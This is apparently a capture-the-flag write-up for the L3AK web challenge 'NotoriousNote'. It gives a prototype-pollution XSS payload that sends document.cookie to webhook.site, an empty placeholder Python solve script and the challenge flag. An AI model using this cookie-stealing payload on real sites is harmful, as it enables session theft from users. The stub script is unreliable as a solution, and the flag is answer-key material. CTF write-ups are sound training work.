# NotoriousNote

- **Author:** S1mple
- **Category:** Web
- **Solves:** 135

## Description

Casual coding vibes...until the notes start acting weird. Author: S1mple <http://34.134.162.213:17002> [dst.zip](<https://ctf.l3ak.team/files/d5d05524a7bccce4d6d0133d32f1a339/dist.zip?token=eyJ1c2VyX2lkIjoxMTQ3LCJ0ZWFtX2lkIjo1NjIsImZpbGVfaWQiOjQ4fQ.aHGmVA.vzzHASrrIMJYjOafifWoE38ZIF0>)
NotoriousNote.zip

---

## Payload

```html
<iframe onload=fetch('https://webhook.site',{method:'POST',mode:'no-cors',body:document.cookie});>&__proto__[*]=onload
```

```py
#!/usr/bin/env python3

import requests

TARGET_URL = "http://localhost:5000"

def solve():
    s = requests.Session()
    # Exploit implementation
    pass

if __name__ == "__main__":
    solve()
```

## Flag

L3AK{v1b3_c0d1n9_w3nt_t00_d33p_4nd_3nd3d_1n_xss}
